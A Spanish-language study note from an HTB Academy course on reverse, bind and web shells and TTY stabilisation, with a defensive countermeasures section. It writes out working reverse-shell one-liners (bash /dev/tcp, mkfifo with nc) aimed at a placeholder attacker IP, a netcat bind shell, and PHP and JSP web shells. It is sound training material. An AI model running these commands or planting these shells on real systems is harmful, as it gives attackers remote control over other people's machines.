---
tags:
  - tecnica
  - categoria/execution
  - categoria/persistence
  - os/linux
  - os/windows
  - nivel/basico
fecha_aprendida: 2026-09-30
fuente: HTB-Academy/Getting-Started
mitre_technique: T1059
---
# ⚔️ Tipos de Shells y Estabilización

> [!abstract] Resumen
> Canales de comunicación e interacción con el sistema operativo remoto tras RCE. La diferencia crítica radica en la **dirección del handshake TCP** (Reverse vs. Bind) o en el uso de la **capa de aplicación sin estado** (Web Shell). Incluye el protocolo de upgrade a PTY interactiva.

---

## ¿Qué es y por qué funciona?

Una vulnerabilidad RCE aislada obliga a reenviar el exploit por cada comando. Para operar de forma continua, se establecen shells interactivas o intermedias.

### 1. Reverse Shell (Inversa)
- **Mecanismo:** La víctima inicia la conexión saliente hacia nuestro listener (`nc -lvnp`).
- **Por qué funciona:** En la mayoría de redes, los firewalls (inbound) bloquean conexiones entrantes hacia puertos no publicados, pero permiten tráfico saliente (egress/outbound) hacia Internet o la VPN (`tun0`).
- **Debilidad:** Si el proceso termina o la red fluctúa, la sesión muere y se debe relanzar el exploit.

### 2. Bind Shell (Directa)
- **Mecanismo:** El payload en la víctima abre un socket a la escucha (bind) en un puerto y el atacante se conecta a él.
- **Por qué funciona:** Alternativa cuando la víctima tiene bloqueado el tráfico saliente (egress filtering estricto) o el atacante está tras un NAT/firewall que le impide recibir conexiones.
- **Debilidad:** Suele ser bloqueada por firewalls entrantes. Ventaja: si la conexión TCP se corta pero el listener sigue activo en la víctima, es posible reconectar sin re-explotar.

### 3. Web Shell
- **Mecanismo:** Script interpretado (PHP, JSP, ASPX) alojado en el webroot (`/var/www/html/`, `inetpub\wwwroot\`) que recibe comandos por parámetro HTTP (GET/POST) y los pasa a funciones del sistema (`system()`, `eval()`).
- **Por qué funciona:** No abre puertos nuevos ni genera conexiones TCP secundarias; viaja camuflado sobre HTTP/HTTPS (puertos 80/443).
- **Debilidad:** Es **sin estado (stateless)** y no interactiva. Ventaja: persiste ante reinicios del host sin requerir re-explotación.

### 4. Anatomía de la TTY y Estabilización
- **El problema de Netcat:** Netcat redirige flujos de texto crudo mediante un socket TCP, pero **no asigna un pseudo-terminal (PTY)**:
  - Sin historial de comandos (flechas imprimen caracteres de escape como `^[[A`).
  - Sin autocompletado (`Tab`).
  - Sin gestión de señales: un `Ctrl+C` destruye el netcat local en lugar de abortar el comando remoto.
  - Dimensiones indefinidas (`rows 0, cols 0`), rompiendo editores como `nano` o `vim`.
- **La solución (`stty raw -echo`):**
  1. Instanciar una PTY en el target (`python3 -c 'import pty; pty.spawn("/bin/bash")'`).
  2. Suspender temporalmente netcat al background con `Ctrl+Z`.
  3. Configurar la terminal local en modo raw (`stty raw -echo`) para que reenvíe caracteres y señales directamente al socket sin interpretarlos localmente.
  4. Devolver netcat a primer plano con `fg`.
  5. Sincronizar emulador (`TERM=xterm-256color`) y dimensiones (`stty rows X columns Y`).

---

## Condiciones necesarias para que aplique

> [!warning] Requisitos
> - **Reverse Shell:** Salida de red permitida desde la víctima hacia la IP atacante (`tun0`) + intérprete disponible en el target (Bash, nc, Python, PowerShell).
> - **Bind Shell:** Puerto local en la víctima alcanzable externamente sin firewall perimetral intermedio.
> - **Web Shell:** Capacidad de escribir en el webroot (vía exploit RCE, file upload o permisos deficientes).
> - **TTY Upgrade:** Intérprete (típicamente Python) presente en el host remoto.

---

## Procedimiento

### 1. Reverse Shell

```bash
# 1. Atacante: Listener a la escucha
nc -lvnp 1234

# 2. Víctima Linux (Bash con redirección /dev/tcp)
bash -c 'bash -i >& /dev/tcp/<IP_ATACANTE>/1234 0>&1'

# Víctima Linux (Named pipe FIFO — estándar cuando nc carece de flag -e o /dev/tcp está deshabilitado)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc <IP_ATACANTE> 1234 > /tmp/f

# Víctima Windows (PowerShell)
# En Windows real, los one-liners clásicos con TCPClient e iex son bloqueados de inmediato por AMSI/Defender.
# Para auditorías se emplean herramientas modulares (PowerCat, Nishang Invoke-PowerShellTcp) o generadores
# con ofuscación (RevShells).
```

### 2. Bind Shell

```bash
# 1. Víctima Linux: Levantar listener en puerto 1234 con FIFO
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvp 1234 > /tmp/f

# 2. Atacante: Conectar al puerto remoto
nc <IP_VICTIMA> 1234
```

### 3. Estabilización de TTY (Secuencia estricta)

```bash
# Paso 1: En la shell remota cruda
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Paso 2: Suspender la shell al background local
# Presionar: Ctrl + Z

# Paso 3: En la terminal local
stty raw -echo; fg

# Paso 4: Presionar [Enter] dos veces para reactivar el prompt.

# Paso 5: Dentro de la shell remota, configurar variables de terminal:
export TERM=xterm-256color
stty rows <FILAS> columns <COLUMNAS>

# Nota: Obtener dimensiones locales en otra terminal ejecutando: stty size
```

### 4. Web Shells

Estructura básica: recibir el parámetro HTTP y ejecutarlo en el sistema operativo:

```php
<?php
// PHP Web Shell
if (isset($_REQUEST['cmd'])) {
    $cmd = $_REQUEST['cmd'];
    system($cmd);
}
?>
```

```jsp
<%
// JSP Web Shell
String cmd = request.getParameter("cmd");
if (cmd != null) {
    Runtime.getRuntime().exec(cmd);
}
%>
```

**Webroots habituales:**
- **Apache (Linux):** `/var/www/html/`
- **Nginx (Linux):** `/usr/local/nginx/html/` o `/var/www/html/`
- **IIS (Windows):** `C:\inetpub\wwwroot\`
- **XAMPP (Windows):** `C:\xampp\htdocs\`

**Interacción vía cURL:**
```bash
curl -s -G "http://<IP>/shell.php" --data-urlencode "cmd=id"
```

---

## Tabla Comparativa de Arquitectura

| Tipo de Shell | Origen de Conexión | Tráfico de Red | Interactividad | Resistencia a Caídas |
| ------------- | ------------------- | -------------- | -------------- | -------------------- |
| **Reverse** | Víctima → Atacante | Puerto arbitrario (egress) | Alta (con PTY) | Baja (requiere re-explotar si cae) |
| **Bind** | Atacante → Víctima | Puerto arbitrario (inbound) | Alta (con PTY) | Media (reconectable si listener vive) |
| **Web** | Atacante → Web Server | HTTP / HTTPS (80, 443) | Baja (stateless) | Alta (persiste a reinicios de host) |

---

## Contramedidas (Defensa)

> [!info] ¿Cómo se previene?
> - **Egress Filtering:** Bloquear tráfico saliente hacia IPs y puertos arbitrarios desde servidores en DMZ.
> - **Mínimo Privilegio en Webroot:** El usuario web (`www-data`, `IUSR`) debe tener permisos de solo lectura (`r-x`) sobre el código fuente; nunca permisos de escritura (`w`) en directorios ejecutables.
> - **Hardening de Intérpretes:** Deshabilitar funciones peligrosas en `php.ini` (`disable_functions = exec,passthru,shell_exec,system`).
> - **Detección EDR / SIEM:** Alertar sobre shells hijas (`cmd.exe`, `powershell.exe`, `/bin/bash`) instanciadas por servidores web (`apache2`, `nginx`, `w3wp.exe`).

---

## Dónde la usé

- [[HTB/Vaccine/Vaccine]] — Reverse shell vía `os-shell` con netcat y estabilización de TTY.
- [[HTB-Academy/Getting-Started]] — Sección 10: Tipos de Shells.

---

## Referencias

- [PayloadsAllTheThings — Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [RevShells — Online Reverse Shell Generator](https://www.revshells.com/)
- [MITRE ATT&CK — T1059: Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/)
